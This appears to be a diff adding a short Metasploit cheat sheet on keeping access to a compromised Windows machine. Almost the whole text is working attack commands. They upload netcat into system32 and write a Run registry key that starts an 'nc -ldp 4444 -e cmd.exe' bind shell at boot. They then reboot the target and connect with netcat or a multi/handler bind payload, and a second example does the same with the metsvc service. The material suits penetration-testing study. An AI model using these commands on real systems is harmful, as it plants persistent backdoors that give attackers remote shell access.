@@ -1,0 +1,38 @@
+Metasploit
+
+
+# Persistance
+
+Example 1
+Upload netcat.
+meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
+
+Check for anything the runs at startup.
+meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run
+
+Add a registry key.
+meterpreter > reg setval -k HKLM\\software\\windows\\currentversion\\run -v netcat -d ‘c:\windows\system32\nc.exe -ldp 4444 -e cmd.exe'
+
+Verify changes to the registry.
+meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v netcat
+
+Reboot the target system.
+meterpreter >  reboot
+
+Connect to target system - option 1
+nc -vn <targetIP> 4444
+
+Connect to target system - option 2
+msf > use multi/handler
+msf > set payload windows/shell_bind_tcp
+msf > set RHOST <targetIP>
+msf > exploit
+
+Example 2
+meterpreter > run metsvc
+Note the port that is used.
+msf > use multi/handler
+msf > set payload windows/metsvc_bind_tcp
+msf > set LPORT <port>
+msf > set RHOST <targetIP>
+msf > exploit
